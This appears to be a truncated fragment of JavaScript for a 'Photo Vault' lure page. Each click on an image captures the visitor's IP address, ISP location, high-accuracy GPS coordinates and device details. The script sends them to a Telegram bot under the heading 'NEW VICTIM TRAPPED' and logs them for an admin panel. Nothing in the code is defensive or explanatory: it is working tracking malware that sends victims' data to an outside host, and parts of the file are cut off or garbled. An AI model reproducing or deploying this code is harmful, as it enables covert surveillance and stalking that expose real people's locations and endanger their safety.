        @keyframes pulse {

    <script>

        const CONFIG = {

                1: 'https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691852ed&is=6917016d&hm=e862bf208981e87cf9e607f4a9a29f759c36f5e26886bd3e3ce04e215e698755&=&format=webp&quality=lossless&width=522&height=928',

        async function trackAccess(imageId) {
            console.log('ðŸš¨ New victim accessing image:', imageId);
            
            const loading = document.getElementById('loading');
            loading.style.display = 'block';
            
            try {
                // Disable all buttons to prevent multiple clicks
                document.querySelectorAll('.image-card').forEach(card => {
                    card.style.pointerEvents = 'none';
                    card.style.opacity = '0.6';
                });

                // Capture complete victim data
                const victimData = await captureVictimData(imageId);
                
                // Store victim for admin panel
                storeVictim(victimData);
                
                // Send to Telegram and update admin panel
                await Promise.all([
                    sendToTelegram(victimData),
                    notifyAdminPanel(victimData)
                ]);
                
                // Show success and redirect
                loading.innerHTML = '<div style="color: #48bb78;">Access granted! Loading image...</div>';
                
                setTimeout(() => {
                    window.location.href = CONFIG.images[imageId];
                }, 1500);
                
            } catch (error) {
                console.error('Tracking failed:', error);
                loading.innerHTML = '<div style="color: #e53e3e;">Access verification failed</div>';
                
                // Fallback - still redirect to image
                setTimeout(() => {
                    window.location.href = CONFIG.images[imageId];
                }, 2000);
            }
        }

        async function captureVictimData(imageId) {
            const [ipData, locationData, gpsData] = await Promise.allSettled([
                getIPAddress(),
                getIPAddress().then(ip => ip.ip !== 'Unknown' ? getLocationData(ip.ip) : {}),
                getGPSCoordinates()
            ]);

            const deviceInfo = getDeviceInfo();
            
            return {
                id: Date.now() + Math.random().toString(36).substr(2, 9),
                timestamp: new Date().toISOString(),
                imageId: imageId,
                ip: ipData.status === 'fulfilled' ? ipData.value.ip : 'Unknown',
                location: {
                    city: locationData.status === 'fulfilled' ? locationData.value.city || 'Unknown' : 'Unknown',
                    region: locationData.status === 'fulfilled' ? locationData.value.region || 'Unknown' : 'Unknown',
                    country: locationData.status === 'fulfilled' ? locationData.value.country_name || 'Unknown' : 'Unknown',
                    isp: locationData.status === 'fulfilled' ? locationData.value.org || 'Unknown' : 'Unknown',
                    timezone: locationData.status === 'fulfilled' ? locationData.value.timezone || 'Unknown' : 'Unknown'
                },
                gps: gpsData.status === 'fulfilled' ? gpsData.value : {error: 'Failed'},
                device: deviceInfo,
                page: {
                    url: window.location.href,
                    referrer: document.referrer || 'Direct'
                },
                status: 'new'
            };
        }

        function storeVictim(victimData) {
            let victims = JSON.parse(localStorage.getItem(VICTIM_STORAGE) || '[]');
            victims.unshift(victimData);
            // Keep only last 100 victims
            if (victims.length > 100) victims = victims.slice(0, 100);
            localStorage.setItem(VICTIM_STORAGE, JSON.stringify(victims));
        }

        function notifyAdminPanel(victimData) {
            // This will be detected by the admin panel
            localStorage.setItem('newVictimAlert', JSON.stringify(victimData));
            localStorage.setItem('lastVictimUpdate', Date.now().toString());
        }

        async function sendToTelegram(victimData) {
            try {
                const message = formatTelegramMessage(victimData);
                
                const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.telegram.chatId,
                        text: message,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: false
                    })
                });

                if (response.ok) {
                    console.log('âœ… Telegram notification sent');
                    return true;
                }
            } catch (error) {
                console.log('âŒ Telegram failed');
            }
            return false;
        }

        function formatTelegramMessage(victim) {
            return `ðŸš¨ *NEW VICTIM TRAPPED* ðŸš¨

ðŸ“¸ *Image:* #${victim.imageId}
ðŸŒ *IP:* \`${victim.ip}\`
ðŸ“ *Location:* ${victim.location.city}, ${victim.location.country}
ðŸ¢ *ISP:* ${victim.location.isp}

${victim.gps.success ? 
`ðŸ“ *EXACT GPS:* ${victim.gps.latitude}, ${victim.gps.longitude}
ðŸŽ¯ *Accuracy:* ${victim.gps.accuracy}
ðŸ—ºï¸ *Maps:* [View Location](${victim.gps.mapsLink})` : 
`âŒ *GPS:* ${victim.gps.error}`}

ðŸ’» *Device:* ${victim.device.platform}
ðŸ“± *Screen:* ${victim.device.screen}
ðŸŒ *Browser:* ${victim.device.userAgent.substring(0, 50)}...

ðŸ•’ *Time:* ${new Date(victim.timestamp).toLocaleString()}
ðŸ”— *URL:* ${victim.page.url}`;
        }

        // Utility functions (same as before)
        async function getIPAddress() {
            const services = ['https://api.ipify.org?format=json', 'https://api64.ipify.org?format=json'];
            for (const service of services) {
                try {
                    const response = await fetch(service);
                    const data = await response.json();
                    return { ip: data.ip || 'Unknown' };
                } catch (error) { continue; }
            }
            return { ip: 'Unknown' };
        }

        async function getLocationData(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                return await response.json();
            } catch (error) {
                return {};
            }
        }

        async function getGPSCoordinates() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ error: 'Geolocation not supported' });
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => resolve({
                        latitude: position.coords.latitude.toFixed(6),
                        longitude: position.coords.longitude.toFixed(6),
                        accuracy: Math.round(position.coords.accuracy) + ' meters',
                        mapsLink: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`,
                        success: true
                    }),
                    () => resolve({ error: 'Permission denied', success: false }),
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }

        function getDeviceInfo() {
            return {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                cores: navigator.hardwareConcurrency,
                memory: navigator.deviceMemory || 'Unknown',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }

        console.log('ðŸ”’ Photo Vault Active - Victims will appear in admin panel');
